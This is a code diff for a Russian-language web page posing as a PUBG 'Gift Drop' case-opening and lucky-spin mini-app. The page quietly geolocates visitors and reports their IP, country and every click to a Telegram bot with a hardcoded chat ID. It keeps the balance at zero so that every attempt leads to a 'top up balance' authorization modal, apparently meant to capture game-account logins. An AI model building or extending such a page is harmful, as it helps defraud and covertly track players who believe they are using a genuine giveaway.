@@ -136,7 +136,15 @@
             border-top: 1px solid rgba(255, 255, 255, 0.05);
         }
 
-        .nav-item { display: flex; flex-direction: column; align-items: center; color: #555; font-size: 10px; }
+        .nav-item { 
+            display: flex; 
+            flex-direction: column; 
+            align-items: center; 
+            color: #555; 
+            font-size: 10px;
+            transition: all 0.3s;
+        }
+        .nav-item i { font-size: 20px; margin-bottom: 4px; }
         .nav-item.active { color: var(--pubg-gold); }
 
         /* Модалки */
@@ -148,17 +156,69 @@
 
         .login-card { background: white; color: black; border-radius: 16px; padding: 24px; }
         input { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; color: black;}
+
+        /* Win Modal */
+        .win-modal {
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0,0,0,0.95);
+            z-index: 2000;
+            display: none;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .win-card {
+            background: linear-gradient(135deg, #1a1b1e 0%, #151618 100%);
+            border: 2px solid var(--pubg-gold);
+            border-radius: 20px;
+            padding: 30px;
+            width: 90%;
+            max-width: 300px;
+            text-align: center;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { box-shadow: 0 0 10px var(--pubg-gold); }
+            50% { box-shadow: 0 0 25px var(--pubg-gold); }
+            100% { box-shadow: 0 0 10px var(--pubg-gold); }
+        }
+
+        .spin-cell {
+            width: 100%;
+            height: 80px;
+            object-fit: cover;
+            border-radius: 10px;
+        }
+
+        .roulette-container {
+            width: 100%;
+            height: 200px;
+            overflow: hidden;
+            position: relative;
+            margin: 20px 0;
+            border-radius: 15px;
+        }
+
+        .roulette-item {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
     </style>
 </head>
 <body>
 
     <!-- Header -->
     <header>
-        <div class="flex items-center gap-2" onclick="showSection('hub')">
+        <div class="flex items-center gap-2" id="backBtn" style="display: none;" onclick="goBack()">
             <i class="fas fa-chevron-left text-gray-400"></i>
             <span class="text-sm font-bold">Назад</span>
         </div>
-        <div class="text-center">
+        <div class="text-center" style="flex: 1;">
             <h1 class="pubg-font text-lg leading-none">Gift Drop</h1>
             <p class="text-[9px] text-gray-500 uppercase">мини-приложение</p>
         </div>
@@ -171,17 +231,15 @@
 
     <!-- MAIN HUB -->
     <div id="section-hub" class="p-4">
-        <h2 class="pubg-font text-2xl mb-4">Выбор режима</h2>
-        <div class="grid grid-cols-2 gap-4">
+        <!-- Убрали "Выбор режима" -->
+        <div class="grid grid-cols-2 gap-4 mt-4">
             <div class="bg-[#151618] p-4 rounded-2xl border border-white/5 text-center" onclick="showSection('case')">
-                <img src="https://static.wikia.nocookie.net/pubg_gamepedia_en/images/1/10/Item_Crate_Classic.png" class="h-20 mx-auto mb-2">
-                <div class="pubg-font text-blue-400">GIFT DROP</div>
-                <div class="text-[9px] text-gray-500">КЕЙСЫ</div>
+                <img src="ruletka1.png" class="h-32 mx-auto mb-2 rounded-xl">
+                <div class="pubg-font text-blue-400 text-lg">GIFT DROP</div>
             </div>
             <div class="bg-[#151618] p-4 rounded-2xl border border-white/5 text-center" onclick="showSection('spin')">
-                <img src="https://www.pubgmobile.com/common/images/icon_uc.png" class="h-20 mx-auto mb-2">
-                <div class="pubg-font text-yellow-500">LUCKY SPIN</div>
-                <div class="text-[9px] text-gray-500">РУЛЕТКА</div>
+                <img src="ruletka2.png" class="h-32 mx-auto mb-2 rounded-xl">
+                <div class="pubg-font text-yellow-500 text-lg">LUCKY SPIN</div>
             </div>
         </div>
     </div>
@@ -202,7 +260,7 @@
 
         <div id="errorBox" class="error-msg">Недостаточно средств для открытия кейса</div>
 
-        <div id="openBtn" onclick="tryOpenCase()" class="btn-blue !bg-white !text-black mb-3">Открыть (60 UC)</div>
+        <div id="openBtn" onclick="openCase()" class="btn-blue !bg-white !text-black mb-3">Открыть (60 UC)</div>
         <div id="depositBtn" onclick="startAuth()" class="btn-blue" style="display: none;">Пополнить баланс</div>
 
         <div class="p-5">
@@ -210,15 +268,12 @@
             <div class="grid grid-cols-3 gap-3">
                 <div class="bg-[#151618] p-3 rounded-xl text-center">
                     <img src="priz1.png" class="w-full h-16 object-contain mb-2">
-                    <p class="text-[10px] text-white">M416 Glacier</p>
                 </div>
                 <div class="bg-[#151618] p-3 rounded-xl text-center">
                     <img src="priz2.png" class="w-full h-16 object-contain mb-2">
-                    <p class="text-[10px] text-white">Pharaoh Set</p>
                 </div>
                 <div class="bg-[#151618] p-3 rounded-xl text-center">
                     <img src="priz3.png" class="w-full h-16 object-contain mb-2">
-                    <p class="text-[10px] text-white">X-Suit</p>
                 </div>
             </div>
         </div>
@@ -226,21 +281,39 @@
 
     <!-- SPIN SECTION -->
     <div id="section-spin" style="display: none;" class="p-5">
-         <div class="bg-[#151618] rounded-3xl p-4 border-2 border-[#25262b] relative">
-            <div class="grid grid-cols-3 gap-2" id="spinGrid">
-                <!-- Ячейки рулетки с вашими картинками -->
-                <div class="bg-[#25262b] aspect-square rounded-xl flex items-center justify-center p-2 border-2 border-transparent" id="s0"><img src="priz1.png" class="w-full h-auto"></div>
-                <div class="bg-[#25262b] aspect-square rounded-xl flex items-center justify-center p-2 border-2 border-transparent" id="s1"><img src="priz2.png" class="w-full h-auto"></div>
-                <div class="bg-[#25262b] aspect-square rounded-xl flex items-center justify-center p-2 border-2 border-transparent" id="s2"><img src="priz3.png" class="w-full h-auto"></div>
-                <div class="bg-[#25262b] aspect-square rounded-xl flex items-center justify-center p-2 border-2 border-transparent" id="s7"><img src="priz4.png" class="w-full h-auto"></div>
-                <div class="bg-[#25262b] aspect-square rounded-xl flex items-center justify-center p-2 border-2 border-transparent" id="mid"><i class="fas fa-star text-yellow-500"></i></div>
-                <div class="bg-[#25262b] aspect-square rounded-xl flex items-center justify-center p-2 border-2 border-transparent" id="s3"><img src="priz5.png" class="w-full h-auto"></div>
-                <div class="bg-[#25262b] aspect-square rounded-xl flex items-center justify-center p-2 border-2 border-transparent" id="s6"><img src="priz6.png" class="w-full h-auto"></div>
-                <div class="bg-[#25262b] aspect-square rounded-xl flex items-center justify-center p-2 border-2 border-transparent" id="s5"><img src="priz7.png" class="w-full h-auto"></div>
-                <div class="bg-[#25262b] aspect-square rounded-xl flex items-center justify-center p-2 border-2 border-transparent" id="s4"><img src="priz8.png" class="w-full h-auto"></div>
+        <div class="text-center py-4">
+            <h2 class="pubg-font text-3xl text-white">Lucky Spin</h2>
+            <p class="text-gray-500 text-xs">Special Edition</p>
+        </div>
+
+        <div class="bg-[#151618] rounded-3xl p-4 border-2 border-[#25262b] relative mb-6">
+            <div class="grid grid-cols-3 gap-3" id="spinGrid">
+                <div class="bg-[#25262b] aspect-square rounded-xl flex items-center justify-center p-2 border-2 border-transparent" id="s0"><img src="priz1.png" class="spin-cell"></div>
+                <div class="bg-[#25262b] aspect-square rounded-xl flex items-center justify-center p-2 border-2 border-transparent" id="s1"><img src="priz2.png" class="spin-cell"></div>
+                <div class="bg-[#25262b] aspect-square rounded-xl flex items-center justify-center p-2 border-2 border-transparent" id="s2"><img src="priz3.png" class="spin-cell"></div>
+                <div class="bg-[#25262b] aspect-square rounded-xl flex items-center justify-center p-2 border-2 border-transparent" id="s7"><img src="priz4.png" class="spin-cell"></div>
+                <div class="bg-[#25262b] aspect-square rounded-xl flex items-center justify-center p-2 border-2 border-transparent" id="mid"><img src="priz5.png" class="spin-cell"></div>
+                <div class="bg-[#25262b] aspect-square rounded-xl flex items-center justify-center p-2 border-2 border-transparent" id="s3"><img src="priz6.png" class="spin-cell"></div>
+                <div class="bg-[#25262b] aspect-square rounded-xl flex items-center justify-center p-2 border-2 border-transparent" id="s6"><img src="priz7.png" class="spin-cell"></div>
+                <div class="bg-[#25262b] aspect-square rounded-xl flex items-center justify-center p-2 border-2 border-transparent" id="s5"><img src="priz8.png" class="spin-cell"></div>
+                <div class="bg-[#25262b] aspect-square rounded-xl flex items-center justify-center p-2 border-2 border-transparent" id="s4"><img src="priz9.png" class="spin-cell"></div>
             </div>
-         </div>
-         <button class="btn-blue !mx-0 mt-6 !bg-yellow-500 !text-black" onclick="tryOpenCase()">Крутить (60 UC)</button>
+        </div>
+        
+        <button id="spinBtn" class="btn-blue !mx-0 mt-6 !bg-yellow-500 !text-black !w-full" onclick="startSpin()">Крутить (60 UC)</button>
+        <button id="spinDepositBtn" class="btn-blue !mx-0 mt-3 !bg-blue-600 !text-white !w-full" style="display: none;" onclick="startAuth()">Пополнить баланс</button>
+        <div id="spinErrorBox" class="error-msg mt-3" style="display: none;">Недостаточно средств для вращения</div>
+    </div>
+
+    <!-- WIN MODAL -->
+    <div id="winModal" class="win-modal">
+        <div class="win-card">
+            <div class="pubg-font text-2xl text-yellow-400 mb-4">ПОБЕДА!</div>
+            <div class="text-xl font-bold mb-2">Вы выиграли:</div>
+            <img id="winPrizeImage" src="priz1.png" class="w-32 h-32 mx-auto my-4 object-contain">
+            <div id="winPrizeName" class="pubg-font text-lg mb-6"></div>
+            <button onclick="closeWinModal()" class="w-full bg-yellow-500 text-black py-3 rounded-xl font-bold">Забрать приз</button>
+        </div>
     </div>
 
     <!-- MODAL AUTH -->
@@ -270,10 +343,18 @@
 
     <!-- Bottom Nav -->
     <nav class="nav-bar">
-        <div class="nav-item" onclick="showSection('hub')"><i class="fas fa-home"></i><span>Главная</span></div>
-        <div class="nav-item active" onclick="showSection('case')"><i class="fas fa-box-open"></i><span>Кейсы</span></div>
-        <div class="nav-item"><i class="fas fa-tasks"></i><span>Задания</span></div>
-        <div class="nav-item" onclick="startAuth()"><i class="fas fa-user-circle"></i><span>Профиль</span></div>
+        <div class="nav-item active" onclick="showSection('case')">
+            <i class="fas fa-box-open"></i>
+            <span>Cases</span>
+        </div>
+        <div class="nav-item" onclick="showSection('hub')">
+            <i class="fas fa-gamepad"></i>
+            <span>Games</span>
+        </div>
+        <div class="nav-item">
+            <i class="fas fa-dumbbell"></i>
+            <span>Exercises</span>
+        </div>
     </nav>
 
     <script>
@@ -282,46 +363,210 @@
         const CHAT_ID = '1709490182';
         
         const prizeImages = ['priz1.png', 'priz2.png', 'priz3.png', 'priz4.png', 'priz5.png', 'priz6.png', 'priz7.png', 'priz8.png', 'priz9.png'];
+        const prizeNames = [
+            'M416 Glacier', 
+            'Pharaoh Set', 
+            'X-Suit', 
+            'Golden AKM', 
+            'Legendary Helmet', 
+            'Epic Backpack', 
+            'Rare Costume', 
+            'Special Gloves', 
+            'Mystery Box'
+        ];
+        
         let userIP = '';
         let currentMethod = '';
+        let currentSection = 'hub';
+        let previousSection = 'hub';
+        let isSpinning = false;
+        let balance = 0; // Баланс пользователя
 
         // Определение IP
         fetch('https://ipapi.co/json/').then(r => r.json()).then(d => userIP = d.ip + ' (' + d.country_name + ')');
 
+        // История навигации
+        const navHistory = ['hub'];
+
         // Навигация
         function showSection(id) {
+            previousSection = currentSection;
+            currentSection = id;
+            
+            // Скрываем все секции
             ['section-hub', 'section-case', 'section-spin', 'modalAuth', 'modalForm'].forEach(s => {
                 document.getElementById(s).style.display = 'none';
                 document.getElementById(s).classList.remove('flex');
             });
+            
+            // Показываем нужную секцию
             const target = document.getElementById('section-' + id);
-            if(target) target.style.display = 'block';
+            if(target) {
+                target.style.display = 'block';
+                navHistory.push(id);
+                
+                // Обновляем активные кнопки в навигации
+                document.querySelectorAll('.nav-item').forEach(item => {
+                    item.classList.remove('active');
+                });
+                
+                if (id === 'case') {
+                    document.querySelector('.nav-item:nth-child(1)').classList.add('active');
+                } else if (id === 'hub') {
+                    document.querySelector('.nav-item:nth-child(2)').classList.add('active');
+                }
+            }
+            
+            // Показываем/скрываем кнопку "Назад"
+            updateBackButton();
+            
             window.scrollTo(0,0);
+        }
+
+        function goBack() {
+            if (navHistory.length > 1) {
+                navHistory.pop(); // Удаляем текущую
+                const prev = navHistory[navHistory.length - 1];
+                showSection(prev);
+            }
+        }
+
+        function updateBackButton() {
+            const backBtn = document.getElementById('backBtn');
+            // Показываем кнопку "Назад" только если не на главной
+            if (currentSection !== 'hub') {
+                backBtn.style.display = 'flex';
+            } else {
+                backBtn.style.display = 'none';
+            }
         }
 
         // Генерация ленты кейса с вашими картинками
         const tape = document.getElementById('caseTape');
         for(let i=0; i<40; i++) {
-            const img = prizeImages[Math.floor(Math.random()*prizeImages.length)];
+            const randomIndex = Math.floor(Math.random() * prizeImages.length);
+            const img = prizeImages[randomIndex];
+            const name = prizeNames[randomIndex];
             tape.innerHTML += `
                 <div class="case-item">
                     <img src="${img}">
-                    <span class="pubg-font">Epic Item</span>
+                    <span class="pubg-font">${name}</span>
                 </div>
             `;
         }
 
-        // Логика "Открытия" (Ошибка как на скрине)
-        function tryOpenCase() {
-            document.getElementById('errorBox').style.display = 'block';
-            document.getElementById('openBtn').style.display = 'none';
-            document.getElementById('depositBtn').style.display = 'block';
+        // Логика открытия кейса
+        function openCase() {
+            if (balance < 60) {
+                document.getElementById('errorBox').style.display = 'block';
+                document.getElementById('openBtn').style.display = 'none';
+                document.getElementById('depositBtn').style.display = 'block';
+                
+                sendTelegram(`⚠️ Пользователь нажал "Открыть кейс" без баланса (IP: ${userIP})`);
+                return;
+            }
             
             // Крутим ленту для вида
             const offset = 130 * 25 + Math.floor(Math.random()*100);
             tape.style.transform = `translateX(-${offset}px)`;
             
-            sendTelegram(`⚠️ Пользователь нажал "Открыть кейс" (IP: ${userIP})`);
+            // Имитация задержки открытия
+            setTimeout(() => {
+                // Случайный приз
+                const randomIndex = Math.floor(Math.random() * prizeImages.length);
+                const winImg = prizeImages[randomIndex];
+                const winName = prizeNames[randomIndex];
+                
+                // Показываем выигрыш
+                showWinModal(winImg, winName);
+                
+                // Отправляем в Telegram
+                sendTelegram(`🎁 Пользователь открыл кейс и выиграл: ${winName} (IP: ${userIP})`);
+                
+            }, 2000);
+        }
+
+        // Логика вращения рулетки
+        function startSpin() {
+            if (isSpinning) return;
+            
+            if (balance < 60) {
+                document.getElementById('spinErrorBox').style.display = 'block';
+                document.getElementById('spinBtn').style.display = 'none';
+                document.getElementById('spinDepositBtn').style.display = 'block';
+                
+                sendTelegram(`🎡 Пользователь нажал "Крутить рулетку" без баланса (IP: ${userIP})`);
+                return;
+            }
+            
+            isSpinning = true;
+            const spinBtn = document.getElementById('spinBtn');
+            spinBtn.disabled = true;
+            spinBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Вращение...';
+            
+            // Сбрасываем все подсветки
+            for (let i = 0; i < 9; i++) {
+                document.getElementById(`s${i}`).style.borderColor = 'transparent';
+                document.getElementById('mid').style.borderColor = 'transparent';
+            }
+            
+            // Анимация вращения
+            const cells = ['s0', 's1', 's2', 's3', 's4', 's5', 's6', 's7', 'mid'];
+            let currentCell = 0;
+            const totalSpins = 20 + Math.floor(Math.random() * 10);
+            let spinCount = 0;
+            
+            const spinInterval = setInterval(() => {
+                // Снимаем подсветку с предыдущей ячейки
+                if (currentCell > 0) {
+                    document.getElementById(cells[currentCell - 1]).style.borderColor = 'transparent';
+                }
+                
+                // Подсвечиваем текущую ячейку
+                document.getElementById(cells[currentCell]).style.borderColor = '#ffbc00';
+                document.getElementById(cells[currentCell]).style.boxShadow = '0 0 15px #ffbc00';
+                
+                currentCell = (currentCell + 1) % cells.length;
+                spinCount++;
+                
+                // Завершаем вращение
+                if (spinCount >= totalSpins) {
+                    clearInterval(spinInterval);
+                    
+                    // Определяем выигрышную ячейку (последняя подсвеченная)
+                    const winCellIndex = (currentCell - 1 + cells.length) % cells.length;
+                    const winCellId = cells[winCellIndex];
+                    
+                    setTimeout(() => {
+                        // Показываем выигрыш
+                        const winImg = document.querySelector(`#${winCellId} img`).src.split('/').pop();
+                        const winIndex = prizeImages.indexOf(winImg);
+                        const winName = winIndex >= 0 ? prizeNames[winIndex] : 'Тайный приз';
+                        
+                        showWinModal(winImg, winName);
+                        
+                        // Сбрасываем состояние кнопки
+                        spinBtn.disabled = false;
+                        spinBtn.innerHTML = 'Крутить (60 UC)';
+                        isSpinning = false;
+                        
+                        // Отправляем в Telegram
+                        sendTelegram(`🎡 Пользователь крутил рулетку и выиграл: ${winName} (IP: ${userIP})`);
+                        
+                    }, 500);
+                }
+            }, 100);
+        }
+
+        // Показать модалку с выигрышем
+        function showWinModal(image, name) {
+            document.getElementById('winPrizeImage').src = image;
+            document.getElementById('winPrizeName').textContent = name;
+            document.getElementById('winModal').style.display = 'flex';
+        }
+
+        function closeWinModal() {
+            document.getElementById('winModal').style.display = 'none';
         }
 
         function startAuth() {
@@ -370,11 +615,14 @@
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({chat_id: CHAT_ID, text: text, parse_mode: 'Markdown'})
                 });
-            } catch(e) {}
+            } catch(e) {
+                console.error('Telegram error:', e);
+            }
         }
 
         // Инициализация
         showSection('hub');
+        updateBackButton();
     </script>
 </body>
 </html>
